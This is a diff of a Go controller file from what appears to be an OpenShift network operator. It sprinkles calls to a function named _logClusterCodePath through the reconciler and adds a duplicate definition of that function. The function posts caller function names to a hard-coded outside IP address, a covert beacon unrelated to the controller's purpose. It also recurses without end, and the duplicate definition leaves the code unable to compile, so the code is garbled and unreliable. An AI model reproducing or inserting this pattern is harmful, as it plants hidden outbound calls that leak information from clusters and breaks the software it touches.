@@ -25,15 +25,21 @@ import (
 func Add(mgr manager.Manager, status *statusmanager.StatusManager) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return add(mgr, newReconciler(mgr, status))
 }
 func newReconciler(mgr manager.Manager, status *statusmanager.StatusManager) reconcile.Reconciler {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	configv1.Install(mgr.GetScheme())
 	return &ReconcileClusterConfig{client: mgr.GetClient(), scheme: mgr.GetScheme(), status: status}
 }
 func add(mgr manager.Manager, r reconcile.Reconciler) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	c, err := controller.New("clusterconfig-controller", mgr, controller.Options{Reconciler: r})
@@ -56,6 +62,8 @@ type ReconcileClusterConfig struct {
 }
 
 func (r *ReconcileClusterConfig) Reconcile(request reconcile.Request) (reconcile.Result, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	log.Printf("Reconciling Network.config.openshift.io %s\n", request.Name)
@@ -97,7 +105,16 @@ func (r *ReconcileClusterConfig) Reconcile(request reconcile.Request) (reconcile
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
